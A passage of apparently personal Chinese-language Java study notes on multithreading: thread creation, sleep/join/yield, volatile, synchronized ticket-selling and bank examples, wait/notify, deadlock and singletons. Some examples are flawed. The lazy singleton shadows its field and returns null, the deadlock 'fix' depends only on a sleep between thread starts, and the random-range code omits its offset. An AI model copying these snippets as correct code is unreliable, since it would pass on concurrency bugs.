title="自定义异常的方式"></a>自定义异常的方式</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220910231023392.png" alt="image-20220910231023392"></p><h1 id="day15"><a href="#day15" class="headerlink" title="day15"></a>day15</h1><h2 id="多线程简介"><a href="#多线程简介" class="headerlink" title="多线程简介"></a>多线程简介</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220911001841326.png" alt="image-20220911001841326"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220911002102628.png" alt="image-20220911002102628"></p><p>如何编写多线程程序？</p><ul><li>继承thread类</li><li>实现Runnable接口</li><li>实现Callable接口</li><li>线程池</li></ul><h2 id="实现多线程方式一-继承Thread类"><a href="#实现多线程方式一-继承Thread类" class="headerlink" title="实现多线程方式一:继承Thread类"></a>实现多线程方式一:继承Thread类</h2><p>创建两条线程:</p><p>采用继承的方式创建多线程</p><ul><li>创建一个类继承Thead</li><li>重写run方法，多线程会执行重写的方法</li><li>启动线程:线程对象.start()</li></ul><pre><code class="java">Thread.currentThead().getName()  # 获取当前线程名称</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.thread.extendthread;public class Test1 &#123;    public static void main(String[] args) &#123;        Thread.currentThread().setName(&quot;这是线程一&quot;); //设置主线程的名字        RabbitThead rabbitThead = new RabbitThead(); //创建对象        rabbitThead.setName(&quot;这是线程二&quot;); //设置第二个线程名字        rabbitThead.start(); //启动rabbitThead线程        while (true)&#123;            System.out.println(Thread.currentThread().getName()+&quot;乌龟正在跑&quot;);        &#125;    &#125;&#125;</code></pre><p>RabbitThread.java</p><pre><code class="java">package com.sakura.thread.extendthread;public class RabbitThead extends Thread&#123;    public void run()&#123;        while (true)&#123;            System.out.println(Thread.currentThread().getName()+&quot;兔子正在跑&quot;);        &#125;    &#125;&#125;</code></pre><p>运行结果:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220911004936337.png" alt="image-20220911004936337"></p><h2 id="创建多线程方式二-实现Runnable接口"><a href="#创建多线程方式二-实现Runnable接口" class="headerlink" title="创建多线程方式二:实现Runnable接口"></a>创建多线程方式二:实现Runnable接口</h2><ul><li>创建一个对象实现 Runnable接口</li><li>重写run方法</li><li>创建 Runnable对象</li><li>创建Thread对象 将 Runnable对象作为参数传递</li><li>调用start()方法，启动线程</li></ul><p>继承Thread类与实现Runnable接口创建多线程方法对比:</p><ul><li>继承的方式简单</li><li>实现Runnable接口可以更好的实现资源共享</li></ul><p>示例代码:</p><p>Test.java</p><pre><code class="java">package com.sakura.thread.runnablethread;public class Test &#123;    public static void main(String[] args) &#123;        Thread.currentThread().setName(&quot;这是线程一&quot;);        //1.创建Runnable对象        RabbitRunnable rabbitRunnable = new RabbitRunnable();        //2.创建Thead类，将 Runnable对象作为参数传递        Thread t1 = new Thread(rabbitRunnable);        t1.setName(&quot;这是线程二&quot;); //设置线程二名字        t1.start();        //开启线程        while (true)&#123;            System.out.println(Thread.currentThread().getName()+&quot;乌龟跑&quot;);        &#125;    &#125;&#125;</code></pre><p>RabbitRunnable.java</p><pre><code class="java">package com.sakura.thread.runnablethread;public class RabbitRunnable implements Runnable&#123;    @Override    public void run() &#123;        while (true)&#123;            System.out.println(Thread.currentThread().getName()+&quot;兔子跑&quot;);        &#125;    &#125;&#125;</code></pre><p>运行结果:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220911012040254.png" alt="image-20220911012040254"></p><h2 id="采用匿名内部类的方式创建多线程程序"><a href="#采用匿名内部类的方式创建多线程程序" class="headerlink" title="采用匿名内部类的方式创建多线程程序"></a>采用匿名内部类的方式创建多线程程序</h2><p>示例代码:</p><pre><code class="java">package com.sakura.thread;import org.junit.Test;public class AnonymousTest &#123;    public static void main(String[] args) &#123;        new Thread()&#123;            @Override            public void run() &#123;                while (true)&#123;                    System.out.println(&quot;乌龟跑&quot;);                &#125;            &#125;        &#125;.start();        new Thread(new Runnable() &#123;            @Override            public void run() &#123;                while (true)&#123;                    System.out.println(&quot;兔子跑&quot;);                &#125;            &#125;        &#125;).start();    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220911113641398.png" alt="image-20220911113641398"></p><h2 id="使用构造器赋值线程名"><a href="#使用构造器赋值线程名" class="headerlink" title="使用构造器赋值线程名"></a>使用构造器赋值线程名</h2><p><strong>一、继承Thread类构造器</strong></p><p>使用继承的方式，可以采用this调用父类资源getName()</p><pre><code class="java">package com.sakura.thread;public class Test1 &#123;    public static void main(String[] args) &#123;        RabbitThread1 t1 = new RabbitThread1(&quot;小白兔&quot;);        RabbitThread1 t2 = new RabbitThread1(&quot;小灰兔&quot;);        t1.start();        t2.start();    &#125;&#125;class RabbitThread1 extends Thread&#123;    public RabbitThread1(String name) &#123;        super(name);    &#125;    @Override    public void run() &#123;        for (int i = 0;i&lt;5;i++)&#123;            System.out.println(this.getName()+&quot;正在跑&quot;);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912221159272.png" alt="image-20220912221159272"></p><p>调用父类构造器</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912221227523.png" alt="image-20220912221227523"></p><p><strong>二、继承Runnable接口</strong></p><pre><code class="java">package com.sakura.thread;public class Test2 &#123;    public static void main(String[] args) &#123;        ToriseThread toriseThread = new ToriseThread();        Thread t1 = new Thread(toriseThread,&quot;绿毛龟&quot;);        Thread t2 = new Thread(toriseThread,&quot;杰尼龟&quot;);        t1.start();        t2.start();    &#125;&#125;class ToriseThread implements Runnable&#123;    @Override    public void run() &#123;        for (int i = 0;i&lt;5;i++)&#123;            System.out.println(Thread.currentThread().getName()); //继承Runnable无法调用this        &#125;    &#125;&#125;</code></pre><h2 id="线程常用方法"><a href="#线程常用方法" class="headerlink" title="线程常用方法"></a>线程常用方法</h2><p><strong>构造方法:</strong></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912172319527.png" alt="image-20220912172319527"></p><p><strong>常用方法系列:</strong></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912172409403.png" alt="image-20220912172409403"></p><p><strong>构造器设置名字:</strong></p><p>Test.java</p><pre><code class="java">package com.sakura.thread;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;小白兔&quot;);        Thread t2 = new Thread(rabbitThread,&quot;小黑兔&quot;);        System.out.println(&quot;t1.isAlive()=&quot;+t1.isAlive());        System.out.println(&quot;t2.isAlive()=&quot;+t2.isAlive());        t1.start();        t2.start();        System.out.println(&quot;t1.isAlive()=&quot;+t1.isAlive());        System.out.println(&quot;t2.isAlive()=&quot;+t2.isAlive());    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        while (true)&#123;            System.out.println(Thread.currentThread().getName()+&quot;正在跑&quot;);        &#125;    &#125;&#125;</code></pre><p><strong>设置优先级:</strong></p><pre><code>setPriority(优先级):    1&lt;= 优先级 &lt;=10// 如果没有指定，线程的默认优先级为5// 优先级低也会执行，也有执行机会 </code></pre><p>Test.java</p><pre><code class="java">package com.sakura.thread;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;小白兔&quot;);        Thread t2 = new Thread(rabbitThread,&quot;小黑兔&quot;);        t1.setPriority(10);        t2.setPriority(1);        t1.start();        t2.start();    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        for(int i =0;i&lt;20;i++)&#123;            System.out.println(Thread.currentThread().getName()+&quot;正在跑&quot;);        &#125;    &#125;&#125;</code></pre><p>输出结果:</p><pre><code class="java">小白兔正在跑小白兔正在跑小白兔正在跑小白兔正在跑小白兔正在跑小黑兔正在跑小白兔正在跑小白兔正在跑小白兔正在跑小白兔正在跑小白兔正在跑小白兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小白兔正在跑小黑兔正在跑小白兔正在跑小白兔正在跑小白兔正在跑小白兔正在跑小白兔正在跑小白兔正在跑小白兔正在跑小白兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑小黑兔正在跑</code></pre><p><strong>设置睡眠:</strong></p><p>Test.java</p><pre><code class="java">package com.sakura.thread;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;小白兔&quot;);        Thread t2 = new Thread(rabbitThread,&quot;小黑兔&quot;);        t1.setPriority(10);        t2.setPriority(1);        t1.start();        t2.start();    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        for(int i =0;i&lt;100;i++)&#123;            //run方法出现异常只能采用 try&#123;&#125;catch&#123;&#125;方式处理 因为子类不能抛出比父类更大的异常            //而Runnable中没有抛出异常            try &#123;                Thread.sleep(1000); //单位是毫秒            &#125; catch (InterruptedException e) &#123;                throw new RuntimeException(e);            &#125;            System.out.println(Thread.currentThread().getName()+&quot;正在跑&quot;);        &#125;    &#125;&#125;</code></pre><p><strong>使用join方法插队:</strong></p><p>插队的线程调用join(2000)那么被插队的线程要进行等待 2000ms等插队的线程执行完毕后或者等待时间已到那么继续执行</p><pre><code class="java">package com.sakura.thread;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;小白兔&quot;);        t1.start();        for(int i=0;i&lt;20;i++)&#123;            if (i==10)&#123;                try &#123;                    t1.join();                &#125; catch (InterruptedException e) &#123;                    throw new RuntimeException(e);                &#125;            &#125;            System.out.println(&quot;主线程跑\t&quot;+i);        &#125;    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        for(int i =0;i&lt;20;i++)&#123;            System.out.println(Thread.currentThread().getName()+&quot;\t正在跑\t&quot;+i);        &#125;    &#125;&#125;</code></pre><p>输出:</p><pre><code>主线程跑    0主线程跑    1主线程跑    2主线程跑    3主线程跑    4主线程跑    5主线程跑    6主线程跑    7主线程跑    8小白兔    正在跑    0主线程跑    9小白兔    正在跑    1小白兔    正在跑    2小白兔    正在跑    3小白兔    正在跑    4小白兔    正在跑    5小白兔    正在跑    6小白兔    正在跑    7小白兔    正在跑    8小白兔    正在跑    9小白兔    正在跑    10小白兔    正在跑    11小白兔    正在跑    12小白兔    正在跑    13小白兔    正在跑    14小白兔    正在跑    15小白兔    正在跑    16小白兔    正在跑    17小白兔    正在跑    18小白兔    正在跑    19主线程跑    10主线程跑    11主线程跑    12主线程跑    13主线程跑    14主线程跑    15主线程跑    16主线程跑    17主线程跑    18主线程跑    19</code></pre><p>如果我们设置下等待时间:</p><pre><code class="java">package com.sakura.thread;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;小白兔&quot;);        t1.start();        for(int i=0;i&lt;20;i++)&#123;            if (i==10)&#123;                try &#123;                    t1.join(2000);                &#125; catch (InterruptedException e) &#123;                    throw new RuntimeException(e);                &#125;            &#125;            System.out.println(&quot;主线程跑\t&quot;+i);        &#125;    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        for(int i =0;i&lt;20;i++)&#123;            try &#123;                Thread.sleep(4000);            &#125; catch (InterruptedException e) &#123;                throw new RuntimeException(e);            &#125;            System.out.println(Thread.currentThread().getName()+&quot;\t正在跑\t&quot;+i);        &#125;    &#125;&#125;</code></pre><p>此时输出结果:</p><pre><code class="java">主线程跑    0主线程跑    1主线程跑    2主线程跑    3主线程跑    4主线程跑    5主线程跑    6主线程跑    7主线程跑    8主线程跑    9主线程跑    10主线程跑    11主线程跑    12主线程跑    13主线程跑    14主线程跑    15主线程跑    16主线程跑    17主线程跑    18主线程跑    19小白兔    正在跑    0小白兔    正在跑    1    ...</code></pre><h2 id="常用方法系列二"><a href="#常用方法系列二" class="headerlink" title="常用方法系列二"></a>常用方法系列二</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912224414761.png" alt="image-20220912224414761"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912225128380.png" alt="image-20220912225128380"></p><p><strong>yield()方法-线程的礼让</strong></p><p>所谓线程的礼让不过是从运行状态先回到就绪状态，事实上，当优先级相同时，它们仍然具有相同的概率被调用！</p><p>示例代码:</p><pre><code class="java">package com.sakura.thread.method;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;小灰兔&quot;);        t1.start();        for (int i =0; i&lt;20;i++)&#123;            if (i==5)&#123;                Thread.yield();            &#125;            System.out.println(Thread.currentThread().getName()+&quot;\t正在运行\t&quot;+i);        &#125;    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        for(int i = 0; i&lt;20; i++)&#123;            System.out.println(Thread.currentThread().getName()+&quot;\t正在运行\t&quot;+i);        &#125;    &#125;&#125;</code></pre><p><strong>stop()与setDaemon(true)</strong></p><pre><code class="java">stop() //结束线程setDaemon(true) //守护线程        </code></pre><p>setDaemon的示例用法:</p><pre><code class="java">package com.sakura.thread.method;public class Test &#123;    public static void main(String[] args) &#123;        RabbitThread rabbitThread = new RabbitThread();        Thread t1 = new Thread(rabbitThread,&quot;小灰兔&quot;);        t1.setDaemon(true);        t1.start();        for (int i =0; i&lt;30;i++)&#123;            System.out.println(Thread.currentThread().getName()+&quot;\t正在运行\t&quot;+i);        &#125;    &#125;&#125;class RabbitThread implements Runnable&#123;    @Override    public void run() &#123;        while (true)&#123;            System.out.println(Thread.currentThread().getName()+&quot;\t正在运行\t&quot;);        &#125;    &#125;&#125;</code></pre><p>t1进程是主进程的守护进程，当主进程停止时，t1也会随之停止</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220912233804696.png" alt="image-20220912233804696"></p><p><strong>volatile</strong></p><p>volatile的作用是确保不会因编译器的优化而省略某些指令，volatile的变量是说这变量可能会被意想不到地改变，每次都小心地重新读取这个变量的值，而不是使用保存在寄存器里的备份，这样，编译器就不会去假设这个变量的值了。</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220913001220149.png" alt="image-20220913001220149"></p><p>示例代码:</p><pre><code class="java">package com.sakura.thread.method;public class Test &#123;    public volatile static boolean flag = true; //当没有加volatile程序不会结束，加上后才会结束    public static void main(String[] args) &#123;        new Thread(new Runnable() &#123;            @Override            public void run() &#123;                while (flag)&#123;//                    System.out.println(&quot;程序执行中~~~&quot;);                &#125;            &#125;        &#125;).start();        try &#123;            Thread.sleep(1000);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;        flag = false;    &#125;&#125;</code></pre><h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220913002500973.png" alt="image-20220913002500973"></p><p>线程安全问题:当多个线程操作共享数据时有可能会发生线程安全问题<br>解决线程安全问题:<br>同步代码块<br>同步方法<br>Lock : 公平锁 非公平锁 juc</p><p>模拟火车站卖票，体现线程安全问题:</p><p>问题代码:</p><pre><code class="java">package com.sakura.thread.ticket;public class Test &#123;    public static void main(String[] args) &#123;        TicketThread ticketThread1 = new TicketThread(&quot;售票点一&quot;);        TicketThread ticketThread2 = new TicketThread(&quot;售票点二&quot;);        TicketThread ticketThread3 = new TicketThread(&quot;售票点三&quot;);        ticketThread1.start();        ticketThread2.start();        ticketThread3.start();    &#125;&#125;class TicketThread extends Thread&#123;    public TicketThread(String name) &#123;        super(name);    &#125;    @Override    public void run() &#123;        int count = 100;        while (true)&#123;            if (count &lt;= 0)&#123;                break;            &#125;            System.out.println(Thread.currentThread().getName()+&quot;已卖出第&quot;+count+&quot;票!&quot;);            count--;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220913004908511.png" alt="image-20220913004908511"></p><p>我们可以发现卖的票有重复的，我们本想要卖100张，因为多线程我们实际卖了300张。</p><h2 id="使用同步代码块解决线程安全问题"><a href="#使用同步代码块解决线程安全问题" class="headerlink" title="使用同步代码块解决线程安全问题"></a>使用同步代码块解决线程安全问题</h2><p>出现的问题出现了0票或者重复的票，需要有一个监视器查看卖票的数据</p><p>解决方式一:使用同步代码块:</p><pre><code class="java">synchronized(同步监视器对象)&#123;&#125; //同步监视器对象必须是引用数据类型,当多条线程操作共享数据同步监视器对象必须是同一个</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220913011504347.png" alt="image-20220913011504347"></p><p>保证在同步代码块内只有一条线程在执行其他线程需要在同步代码块外等待</p><pre><code class="java">package com.sakura.thread.ticket;public class Test &#123;    public static void main(String[] args) &#123;        TicketThread ticketThread1 = new TicketThread(&quot;售票点一&quot;);        TicketThread ticketThread2 = new TicketThread(&quot;售票点二&quot;);        TicketThread ticketThread3 = new TicketThread(&quot;售票点三&quot;);        ticketThread1.start();        ticketThread2.start();        ticketThread3.start();    &#125;&#125;class TicketThread extends Thread&#123;    static int count = 100;    public TicketThread(String name) &#123;        super(name);    &#125;    @Override    public void run() &#123;        while (true) &#123;            synchronized (TicketThread.class) &#123;                if (count &lt;= 0) &#123;                    break;                &#125;                System.out.println(this.getName() + &quot;已卖出第&quot; + count + &quot;票!&quot;);                count--;            &#125;        &#125;        &#125;    &#125;</code></pre><p>输出结果:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220913012215185.png" alt="image-20220913012215185"></p><p>ps:当一条线程进入同步代码块内，那么其他线程不能进入拥有同一个同步监视器对象的同步代码块</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220913233014600.png" alt="image-20220913233014600"></p><h2 id="使用同步方法解决线程安全问题"><a href="#使用同步方法解决线程安全问题" class="headerlink" title="使用同步方法解决线程安全问题"></a>使用同步方法解决线程安全问题</h2><p>有一条线程进入同步方法那么其他线程不仅不能进入此方法也不能进入拥有同一个同步监视器对象的同步方法</p><p>示例代码:</p><pre><code class="java">package com.sakura.thread.ticket;public class Test &#123;    public static void main(String[] args) &#123;        TicketThread ticketThread = new TicketThread();        Thread t1 = new Thread(ticketThread,&quot;售票点一&quot;);        Thread t2 = new Thread(ticketThread,&quot;售票点二&quot;);        Thread t3 = new Thread(ticketThread,&quot;售票点三&quot;);        t1.start();        t2.start();        t3.start();        t2.setPriority(10);        t1.setPriority(1);    &#125;&#125;class TicketThread implements Runnable&#123;    int count = 100;    @Override    public void run() &#123;        while (true)&#123;            if (count &lt;=0)&#123;                return;            &#125;            saleTicket();        &#125;    &#125;    private synchronized void saleTicket()&#123;        if (count &lt;=0)&#123;            return;        &#125;        try &#123;            Thread.sleep(10);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;        System.out.println(Thread.currentThread().getName()+&quot;第&quot;+count+&quot;票已卖出&quot;);        count--;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220914002516038.png" alt="image-20220914002516038"></p><h2 id="使用同步代码块解决线程安全问题-练习题"><a href="#使用同步代码块解决线程安全问题-练习题" class="headerlink" title="使用同步代码块解决线程安全问题-练习题"></a>使用同步代码块解决线程安全问题-练习题</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220914010445756.png" alt="image-20220914010445756"></p><pre><code class="java">package com.sakura.thread;import java.util.Scanner;public class AccountTest &#123;    public static void main(String[] args) &#123;        AccountRunnable account = new AccountRunnable();        Thread t1 = new Thread(account,&quot;HJY&quot;);        Thread t2 = new Thread(account,&quot;WYF&quot;);        t1.start();        t2.start();    &#125;&#125;class Account&#123;    int balance = 600;    public void withMoney(int money)&#123;        balance -= money;    &#125;&#125;class AccountRunnable implements Runnable&#123;    Account account = new Account();    @Override    public void run() &#123;            synchronized (account)&#123;                if (account.balance &lt; 500)&#123;                    System.out.println(Thread.currentThread().getName()+&quot;\t您的余额不足，取款失败\t&quot;+account                            .balance);                &#125;else &#123;                    account.withMoney(500);                    System.out.println(Thread.currentThread().getName()+&quot;\t恭喜您\t&quot;+&quot;已成功取出500元&quot;+&quot;您的余额为&quot;+account.balance);        &#125;    &#125;&#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220914010500892.png" alt="image-20220914010500892"></p><h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220914233953966.png" alt="image-20220914233953966"></p><p><strong>饿汉式:</strong></p><p>示例代码:</p><pre><code class="java">package com.sakura.thread.single;public class Test &#123;    public static void main(String[] args) &#123;        Single s1 = Single.INSTANCE;        Single s2 = Single.INSTANCE;        System.out.println(s1==s2);        Single1 s3 = Single1.INSTANCE;        Single1 s4 = Single1.INSTANCE;        System.out.println(s3==s4);    &#125;&#125;class Single&#123;    public static final Single INSTANCE = new Single(); //提前将对象创建了出来    private Single() &#123;    &#125;&#125;enum Single1 &#123;    INSTANCE&#125;</code></pre><p><strong>懒汉式:</strong></p><pre><code class="java">package com.sakura.thread.single;public class Test &#123;    public static void main(String[] args) &#123;        LazyGuys s1 = LazyGuys.withsingle();        LazyGuys s2 = LazyGuys.withsingle();        System.out.println(s1==s2);    &#125;&#125;class LazyGuys&#123;    private LazyGuys()&#123;&#125;    private static LazyGuys lazyGuys;    public synchronized static LazyGuys withsingle()&#123;        if (lazyGuys == null)&#123;            synchronized (Test.class)&#123;            LazyGuys lazyGuys = new LazyGuys();        &#125;        &#125;        return lazyGuys;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915002527942.png" alt="image-20220915002527942"></p><h1 id="day16"><a href="#day16" class="headerlink" title="day16"></a>day16</h1><h2 id="线程通信的初识"><a href="#线程通信的初识" class="headerlink" title="线程通信的初识"></a>线程通信的初识</h2><p>多个线程在处理同一个资源，但是处理的动作（线程的任务）却不相同。而多个线程并发执行时,在默认情况下CPU是随机切换线程的，当我们需要多个线程来共同完成一件任务，并且我们希望他们有规律的执行,那么多线程之间需要一些通信机制，可以协调它们的工作，以此来帮我们达到多线程共同操作一份数据。<br>比如:线程A用来生成包子的，线程B用来吃包子的，包子可以理解为同一资源，线程A与线程B处理的动作，一个是生产，一个是消费，此时B线程必须等到A线程完成后才能执行，那么线程A与线程B之间就需要线程通信，即等待唤醒机制</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915003001047.png" alt="image-20220915003001047"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915003444873.png" alt="image-20220915003444873"></p><h2 id="线程通信采用同步代码实现"><a href="#线程通信采用同步代码实现" class="headerlink" title="线程通信采用同步代码实现"></a>线程通信采用同步代码实现</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915003737856.png" alt="image-20220915003737856"></p><p>示例代码:</p><pre><code class="java">package com.sakura.thread.notify;public class Test &#123;    public static void main(String[] args) &#123;        Bar bar = new Bar();        CookerThread c1 = new CookerThread(bar);        WaiterThread w1 = new WaiterThread();        w1.setBar(bar);        c1.setName(&quot;五星级大厨&quot;);        w1.setName(&quot;海底捞服务员&quot;);        c1.start();        w1.start();    &#125;&#125;class Bar&#123;    int count = 0;    public static final int MAX_ENUM = 10;&#125;class CookerThread extends Thread&#123;    Bar bar;    public CookerThread(Bar bar) &#123;        this.bar = bar;    &#125;    @Override    public void run() &#123;        while (true) &#123;            synchronized (bar) &#123;                if (bar.count &gt;= bar.MAX_ENUM) &#123;                    try &#123;                        bar.wait();                    &#125; catch (InterruptedException e) &#123;                        throw new RuntimeException(e);                    &#125;                &#125;                bar.count++;                System.out.println(Thread.currentThread().getName() + &quot;正在做菜中,这是第&quot; + bar.count + &quot;份菜&quot;);                bar.notify();            &#125;        &#125;    &#125;&#125;class WaiterThread extends Thread&#123;    private Bar bar;    public void setBar(Bar bar) &#123;        this.bar = bar;    &#125;    @Override    public void run() &#123;        while (true) &#123;            synchronized (bar) &#123;                if (bar.count &lt;= 0) &#123;                    try &#123;                        bar.wait();                    &#125; catch (InterruptedException e) &#123;                        throw new RuntimeException(e);                    &#125;                &#125;                bar.count--;                System.out.println(Thread.currentThread().getName() + &quot;正在端菜中,端走后还有&quot; + bar.count + &quot;份菜&quot;);                bar.notify();            &#125;        &#125;        &#125;    &#125;</code></pre><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915134622203.png" alt="image-20220915134622203"></p><p>产生死锁的原因两条线程互相持有对方的锁资源不放松，可以让一条线程先跑完另一条线程再开始</p><p>示例代码:</p><pre><code class="java">package com.sakura.thread.deadlock;public class Test &#123;    public static void main(String[] args) &#123;        Object goods = new Object();        Object money = new Object();        CustomerThread customerThread = new CustomerThread(goods, money);        GoodsThread goodsThread = new GoodsThread(goods, money);        customerThread.setName(&quot;供应商&quot;);        goodsThread.setName(&quot;采购商&quot;);        customerThread.start();        goodsThread.start();    &#125;&#125;    class CustomerThread extends Thread&#123;        Object goods;        Object money;        public CustomerThread(Object goods, Object money) &#123;            this.goods = goods;            this.money = money;        &#125;        @Override        public void run() &#123;            synchronized (goods)&#123;                System.out.println(Thread.currentThread().getName()+&quot;:你奶奶滴，先发货再给钱&quot;);                synchronized (money)&#123;                    System.out.println(Thread.currentThread().getName()+&quot;:已付钱&quot;);                &#125;            &#125;        &#125;    &#125;    class GoodsThread extends Thread&#123;        Object goods;        Object money;        public GoodsThread(Object goods, Object money) &#123;            this.goods = goods;            this.money = money;        &#125;        @Override        public void run() &#123;            synchronized (money)&#123;                System.out.println(Thread.currentThread().getName()+&quot;:你奶奶滴，先给钱再发货&quot;);                synchronized (goods)&#123;                    System.out.println(Thread.currentThread().getName()+&quot;:已发货&quot;);                &#125;            &#125;        &#125;    &#125;</code></pre><p>此时便形成了死锁</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915142520962.png" alt="image-20220915142520962"></p><p>如何解决?</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915142811474.png" alt="image-20220915142811474"></p><p>在两个启动线程的代码中间，使主线程睡眠一段时间，即可避免</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915142903030.png" alt="image-20220915142903030"></p><h2 id="线程的生命周期"><a href="#线程的生命周期" class="headerlink" title="线程的生命周期"></a>线程的生命周期</h2><p><strong>观点一</strong></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915145205272.png" alt="image-20220915145205272"></p><p><strong>观点二</strong></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915145534600.png" alt="image-20220915145534600"></p><h2 id="基础api与常见算法"><a href="#基础api与常见算法" class="headerlink" title="基础api与常见算法"></a>基础api与常见算法</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915145954683.png" alt="image-20220915145954683"></p><h3 id="和数学相关的类"><a href="#和数学相关的类" class="headerlink" title="和数学相关的类"></a>和数学相关的类</h3><p><strong>java.lang.Math</strong></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915150308868.png" alt="image-20220915150308868"></p><pre><code>abs: 求绝对值ceil: 向上取整floor: 向下取整random(): 随机数 [0,1) 左闭右开n 较大的数 m 较小的数[m,n]  ----&gt;       (int)(Math.random()*(n-m+1)+m);pow(n,y)   : n^ysqrt() :开平方round(): 四舍五入</code></pre><p>示例代码:</p><pre><code class="java">package com.sakura.api;public class MathTest &#123;    public static void main(String[] args) &#123;        System.out.println(Math.abs(-10));        System.out.println(Math.ceil(3.00001));        System.out.println(Math.floor(1.999999));        System.out.println(Math.random());        int n = 100;        int m = 55;        System.out.println((int)(Math.random()*(n-m+1)));        System.out.println(Math.pow(2, 4));        System.out.println(Math.sqrt(64));        System.out.println(Math.round(5.4999));        System.out.println(Math.round(5.5));    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915152440508.png" 